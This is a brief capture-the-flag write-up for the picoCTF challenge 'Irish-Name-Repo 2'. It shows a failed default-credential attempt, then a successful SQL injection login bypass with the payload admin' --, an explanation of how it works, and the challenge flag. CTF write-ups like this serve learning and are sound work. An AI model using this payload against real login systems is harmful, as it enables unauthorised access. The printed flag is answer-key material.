# Irish-Name-Repo 2

### Description:

Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login!
Additional details will be available after launching your challenge instance.
`Click "Launch Instance".`
Hint: the password is being filtered

### Commands / Steps:

```bash
# Step 1: Go to the website. No obvious lcues were found in the dev tools.

# Step 2: There's a login page for admin page asking for admin username and password. So, let's try the most common admin credentials to see if they work.
Username: admin
Password: admin
#Login failed.

# Step 3: Next we'll try basic sql injection.
Username: admin' --
Password:
# It worked and we got the flag.
```

### Flag:

> picoCTF{m0R3_SQL_plz_8c334129}

### Notes / Tips

- `SQL Injection`: Classic login bypass using comment syntax (--) to ignore password check
- `Simple Payload`: admin' -- works by:
    - `'` - closes the username string
    - `--` - comments out the rest of the SQL query (including password validation)


